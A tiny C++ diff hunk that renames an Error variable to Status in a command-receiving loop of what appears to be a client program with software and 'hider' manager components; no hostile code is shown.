@@ -50,7 +50,7 @@ void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
 {
     // receive command
     Message msg;
-    Error res;
+    Status res;
     client.recvCommand(msg);
     uint fncode = msg.fnccode();
     std::string param = msg.param1();
